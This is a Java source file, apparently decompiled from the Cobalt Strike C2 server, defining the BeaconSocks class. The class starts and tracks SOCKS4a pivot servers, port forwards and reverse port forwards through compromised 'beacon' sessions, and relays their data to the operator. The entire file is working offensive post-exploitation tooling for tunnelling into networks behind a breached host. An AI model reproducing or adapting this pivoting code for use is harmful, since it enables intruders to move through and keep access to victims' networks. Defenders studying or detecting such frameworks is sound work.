package beacon;

import common.BeaconOutput;
import socks.*;

import java.io.IOException;
import java.util.*;
import java.util.Map.Entry;

public class BeaconSocks {
    protected Map socks = new HashMap();
    protected Map servers = new HashMap();
    protected BeaconC2 controller;

    public BeaconSocks(BeaconC2 c2) {
        this.controller = c2;
    }

    public void notifyClients() {
        LinkedList results = new LinkedList();
        synchronized (this) {

            for (Object o : this.servers.entrySet()) {
                Entry top = (Entry) o;
                String bid = (String) top.getKey();
                List servers = (List) top.getValue();

                for (Object server : servers) {
                    Mortal temp = (Mortal) server;
                    Map row = temp.toMap();
                    row.put("bid", bid);
                    results.add(row);
                }
            }
        }

        this.controller.getCheckinListener().push("socks", results);
    }

    public SocksProxy getBroker(String bid) {
        synchronized (this) {
            if (this.socks.containsKey(bid)) {
                return (SocksProxy) this.socks.get(bid);
            } else {
                SocksProxy proxy = new SocksProxy();
                proxy.addProxyListener(new BeaconProxyListener());
                this.socks.put(bid, proxy);
                return proxy;
            }
        }
    }

    public void track(String bid, Mortal server) {
        synchronized (this) {
            if (!this.servers.containsKey(bid)) {
                this.servers.put(bid, new LinkedList());
            }

            LinkedList mylist = (LinkedList) this.servers.get(bid);
            mylist.add(server);
        }

        this.notifyClients();
    }

    public void pivot(String bid, int port) {
        synchronized (this) {
            SocksProxyServer server = new SocksProxyServer(this.getBroker(bid));

            try {
                server.go(port);
                this.track(bid, server);
                this.controller.getCheckinListener().output(BeaconOutput.Output(bid, "started SOCKS4a server on: " + port));
            } catch (IOException var7) {
                this.controller.getCheckinListener().output(BeaconOutput.Error(bid, "Could not start SOCKS4a server on " + port + ": " + var7.getMessage()));
            }

        }
    }

    protected ReversePortForward findPortForward(String bid, int port) {
        synchronized (this) {
            if (this.servers.containsKey(bid)) {

                for (Object o : ((LinkedList) this.servers.get(bid))) {
                    Mortal next = (Mortal) o;
                    if (next instanceof ReversePortForward) {
                        ReversePortForward candidate = (ReversePortForward) next;
                        if (candidate.getPort() == port) {
                            return candidate;
                        }
                    }
                }
            }

            return null;
        }
    }

    public void accept(String bid, int port, int sid) {
        synchronized (this) {
            ReversePortForward temp = this.findPortForward(bid, port);
            if (temp != null) {
                temp.accept(sid);
            }
        }
    }

    public void portfwd(String bid, int port, String fhost, int fport) {
        synchronized (this) {
            PortForward server = new PortForward(this.getBroker(bid), fhost, fport);

            try {
                server.go(port);
                this.track(bid, server);
                this.controller.getCheckinListener().output(BeaconOutput.Output(bid, "started port forward on " + port + " to " + fhost + ":" + fport));
            } catch (IOException var9) {
                this.controller.getCheckinListener().output(BeaconOutput.Error(bid, "Could not start port forward on " + port + ": " + var9.getMessage()));
            }

        }
    }

    public void rportfwd(String bid, int port, String fhost, int fport) {
        synchronized (this) {
            ReversePortForward server = new ReversePortForward(this.getBroker(bid), port, fhost, fport);
            this.track(bid, server);
            this.controller.getCheckinListener().output(BeaconOutput.Output(bid, "started reverse port forward on " + port + " to " + fhost + ":" + fport));
        }
    }

    public void stop_port(int port) {
        synchronized (this) {
            Iterator i = this.servers.entrySet().iterator();

            while (true) {
                if (!i.hasNext()) {
                    break;
                }

                Entry entry = (Entry) i.next();
                String bid = (String) entry.getKey();
                List mylist = (LinkedList) entry.getValue();
                Iterator j = mylist.iterator();

                while (j.hasNext()) {
                    Mortal next = (Mortal) j.next();
                    if (next.getPort() == port) {
                        this.controller.getCheckinListener().output(BeaconOutput.Output(bid, "stopped proxy pivot on " + port));
                        next.die();
                        j.remove();
                    }
                }

                if (mylist.size() == 0) {
                    i.remove();
                }
            }
        }

        this.notifyClients();
    }

    public void stop(String bid) {
        synchronized (this) {
            if (this.servers.containsKey(bid)) {

                for (Object o : ((LinkedList) this.servers.get(bid))) {
                    Mortal next = (Mortal) o;
                    next.die();
                }

                this.servers.remove(bid);
            }
        }

        this.controller.getCheckinListener().output(BeaconOutput.Output(bid, "stopped SOCKS4a servers"));
        this.notifyClients();
    }

    public boolean isActive(String bid) {
        synchronized (this) {
            return this.servers.containsKey(bid);
        }
    }

    public void die(String bid, int sid) {
        synchronized (this) {
            SocksProxy proxy = (SocksProxy) this.socks.get(bid);
            if (proxy != null) {
                proxy.die(sid);
            }
        }
    }

    public void write(String bid, int sid, byte[] data) {
        synchronized (this) {
            SocksProxy proxy = (SocksProxy) this.socks.get(bid);
            if (proxy != null) {
                proxy.write(sid, data, 0, data.length);
            }
        }
    }

    public void resume(String bid, int sid) {
        synchronized (this) {
            SocksProxy proxy = (SocksProxy) this.socks.get(bid);
            if (proxy != null) {
                proxy.resume(sid);
            }
        }
    }

    public byte[] dump(String bid, int max) {
        synchronized (this) {
            SocksProxy proxy = (SocksProxy) this.socks.get(bid);
            return proxy == null ? new byte[0] : proxy.grab(max);
        }
    }
}
